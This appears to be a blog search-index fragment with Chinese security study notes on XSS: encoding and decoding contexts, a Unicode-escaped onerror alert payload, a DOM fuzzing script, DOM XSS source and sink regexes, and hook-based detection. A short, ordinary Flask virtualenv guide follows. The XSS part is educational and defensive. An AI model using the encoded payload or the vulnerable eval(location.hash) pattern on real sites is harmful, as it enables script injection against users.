class="line">document.write(&apos;\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0040\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0032\u0033\u0029\u0020\u002f\u003e&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　上面2中write出现的结果是相同的，同样的道理，由于上述编码为javascript的编码形式，并且在javascript的上下文环境中，会先进行解码，再运行javascript。<br>JavaScript中的编码：</p><ul><li>Unicode形式：\uH</li><li>普通十六进制：\xH</li><li>纯转义：\’、\”、\&lt;、>这样在特殊字符前加\进行转义</li></ul><p>　　通过上面几个例子，我们可以知道在HTML中与在Javascript中自动解码的差异，如果防御没有区分这样的场景，就会出现问题。<br>　　理解了上述的自解码机制，在不同的标签下会有不同的结果，比如一下几个标签会自带HtmlEncode功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;/noframes&gt;</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;xmp&gt;&lt;/xmp&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;/plaintext&gt;</span><br></pre></td></tr></table></figure></p><p>　　<code>&lt;xmp&gt;</code>没有HtmlEncode功能，<code>&lt;plaintext&gt;</code>在Firefox下会进行HtmlEncode编码，在chrome下不会。</p><h3 id="DOM-fuzzing"><a href="#DOM-fuzzing" class="headerlink" title="DOM fuzzing"></a>DOM fuzzing</h3><p>　　直接看代码把  下面的程序用python编写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def get_template(template_file):</span><br><span class="line">    &quot;&quot;&quot;获取fuzzing的模板文件内容&quot;&quot;&quot;</span><br><span class="line">    content=&apos;&apos;</span><br><span class="line">    with open(template_file) as f:</span><br><span class="line">        content=f.read()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">def set_result(result_file,result):</span><br><span class="line">    &quot;&quot;&quot;生成fuzzing结果文件&quot;&quot;&quot;</span><br><span class="line">    with open(result_file,&apos;w&apos;) as f:</span><br><span class="line">        f.write(result)</span><br><span class="line">def fuzzing(fuzz_file,result_file):</span><br><span class="line">    template=get_template(fuzz_file)</span><br><span class="line">    fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip()</span><br><span class="line">    # chars=[]</span><br><span class="line">    chars=[]</span><br><span class="line">    for i in xrange(255): # ASCII玛转换为字符</span><br><span class="line">        if i!=62:</span><br><span class="line">            chars.append(chr(i))</span><br><span class="line"></span><br><span class="line">    fuzz_area_result=&apos;&apos;</span><br><span class="line">    for c in chars: #遍历这些字符 逐一生成fuzzing内容</span><br><span class="line">        fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c)</span><br><span class="line">        fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c)))</span><br><span class="line">        fuzz_area_result+=fuzz_area_r+&apos;\n&apos;</span><br><span class="line">        print fuzz_area_r</span><br><span class="line">    result=template.replace(fuzz_area,fuzz_area_result)</span><br><span class="line">    set_result(result_file,result)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;)</span><br></pre></td></tr></table></figure></p><p>　　下面为fuzz_xss_0.html的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Fuzz xss 0&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function $(x)&#123;return document.getElementById(x);&#125;</span><br><span class="line">        function f(id)&#123;</span><br><span class="line">            $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;</span><br><span class="line">&lt;code&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing...&lt;/h3&gt;</span><br><span class="line">&lt;fuzz&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;</span><br><span class="line">&lt;/fuzz&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>　　通过上面的fuzzing技巧，可以自行扩展</p><h3 id="DOM-XSS-挖掘"><a href="#DOM-XSS-挖掘" class="headerlink" title="DOM XSS 挖掘"></a>DOM XSS 挖掘</h3><ol><li>静态方法<br>　　静态方法查找危险关键字，可以使用下列正则表达式来匹配。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Finding Sources</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sources (BETA):</span><br><span class="line"></span><br><span class="line">/(location\s*[\[.])|([.\[]\s*[&quot;&apos;]?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/</span><br><span class="line"></span><br><span class="line">Finding Sinks</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sinks (BETA):</span><br><span class="line"></span><br><span class="line">/((src|href|data|location|code|value|action)\s*[&quot;&apos;\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*[&quot;&apos;\]]*\s*\()/</span><br><span class="line"></span><br><span class="line">This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:</span><br><span class="line"></span><br><span class="line">/after\(|\.append\(|\.before\(|\.html\(|\.prepend\(|\.replaceWith\(|\.wrap\(|\.wrapAll\(|\$\(|\.globalEval\(|\.add\(|jQUery\(|\$\(|\.parseHTML\(/</span><br></pre></td></tr></table></figure></li></ol><p>详情可以看<a href="https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki</a><br>一旦发现页面存在可疑特征，就进行人工分析，这是静态方法的代价，对人工参与要求很高</p><ol start="2"><li>动态方法<br>　动态方法相当于一次Javascript源码动态审计的过程。书中提到了两种思路<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(location.hash.substr(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><p>　就拿上面的例子来说，如何检测上面的DOM XSS</p><h6 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h6><p>　　借用浏览器自身的动态性，可以写Firefox插件，批量对目标地址发起请求（一个模糊测试的过程），请求的形式为：在目标地址后加上#fuzzing内容，就当前这个例子来说。比如当前fuzzing内容为：<code>var x=&#39;d0mx55&#39;</code><br>　　并且对常见的输出点函数进行劫持，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var _eval=eval;</span><br><span class="line">eval=function(x)&#123;</span><br><span class="line">if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125;</span><br><span class="line">if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;);</span><br><span class="line">_eval(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>　　在javascript层面劫持innerHTML这样的属性已经没那么容易了，常用的属性劫持可以针对具体的对象设置<code>__defineSetter__</code>，比如下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);</span><br><span class="line">window.x=&apos;xxxxxYYYYYYYY&apos;;</span><br></pre></td></tr></table></figure></p><p>当x赋值的时候，就会触发事先定义好的Setter方法。innerHTML属性属于那些节点对象，想劫持具体节点对象的innerHTML，需要事先知道这个具体节点的对象，然后设置<code>__defineSetter__</code>,这样如果要检测DOM XSS，就要劫持所有的输出点，比较麻烦，那么思路二可能会比较简单一点</p><h6 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h6><p>　　仍然借用浏览器动态执行的优势，写一个Firefox插件，我们完全以黑盒的方式进行模糊测试输入点，然后判断渲染后的DOM树中是否有我们期待的值，比如，模糊测试的内容都有如下一段代码<code>document.write(&#39;d0m&#39;+&#39;x55&#39;)</code>如果这段代码顺利执行了就会存在d0mx55文本节点，后续的检测工作只要判断是否存在这个文本节点就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123;</span><br><span class="line">alert(&apos;found dom xss&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个思路以DOM树的改变为判断依据，简单准确，但是同样无法避免那些逻辑判断上导致的漏报。</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><table><thead><tr><th>输出点</th><th>javascript code</th></tr></thead><tbody><tr><td>直接输出HTML内容</td><td>document.write(…)<br>document.writeln(…)<br> document.body.innerHtml=…</td></tr><tr><td>直接修改DOM树（包括DHTML事件）</td><td>document.forms[0].action=…<br>document.attachEvent(…)<br>document.create…(…)<br>document.execCommand(…)<br>document.body. …<br>widow.attachEvent(…)</td></tr><tr><td>替换document url</td><td>document.location=…(以及直接赋值给location的href,host,hostname属性)<br>document.location.hostname=…<br>document.location.replace(…)<br>document.location.assign(…)<br>documnent.URL=…<br>window.navigate(…)</td></tr><tr><td>打开或修改新窗口</td><td>document.open(…)<br>window.open(…)<br>window.location.href=…(以及直接赋值给location的href,host,hostname属性)</td></tr><tr><td>直接执行脚本</td><td>eval(…)<br>window.execScript(…)<br>window.setInterval(…)<br>window.setTimeout(…)</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask virtualenv环境搭建</title>
      <link href="2016/03/16/old-old-flask-virtualenv/"/>
      <url>2016/03/16/old-old-flask-virtualenv/</url>
      
        <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。<br><a id="more"></a></p><h3 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h3><p>　　这里我推荐使用pip或者easy_install安装，同样也可以通过下载<a href="https://pypi.python.org/pypi/virtualenv" target="_blank" rel="noopener">virtualenv.py</a>来构建虚拟环境。<br>　　使用pip命令 <code>pip install virtualenv</code></p><h3 id="建立环境"><a href="#建立环境" class="headerlink" title="建立环境"></a>建立环境</h3><p>　　首先进入网站的根目录（或者是任何需要建立虚拟环境的文件夹下）<br>　　使用dos命令 <code>virtualenv venv</code> 其中venv为python的虚拟环境，其中包括了python.exe、pip、easy_install等python环境。</p><h3 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h3><p>　　完成上一步后，接下来需要在dos界面激活虚拟环境，这样可以使得接下来下载的python模块都位于venv下的pip环境中<br><code>Scripts\activate   激活虚拟环境</code><br><code>deactivate  退出虚拟环境</code><br>　　激活后命令行开头多了（venv），如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\code\python-workplace\flasker\venv&gt;Scripts\activate</span><br><span class="line">(venv) E:\code\python-workplace\flasker\venv&gt;</span><br></pre></td></tr></table></figure></p><h3 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h3><p>　　在上面的基础下，通过<code>pip install xxxx</code>安装的模块都是安装在venv环境下的，对主机上的环境没有影响。</p><h3 id="引入路径"><a href="#引入路径" class="headerlink" title="引入路径"></a>引入路径</h3><p>　　在具体使用过程中，需要把venv的路径导入sys.path，这样才可以使用虚拟环境中的python模块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">importos,sys</span><br><span class="line">sys.path.append(os.getcwd()+<span class="string">'\\venv\\Lib\\site-packages'</span>)</span><br></pre></td></tr></table></figure></p><p>　　到这里就完成了python虚拟环境的搭建，总体对经常变动编程环境的城旭猿来说这是个非常有用功能。<br>　　<strong>==The End==</strong></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
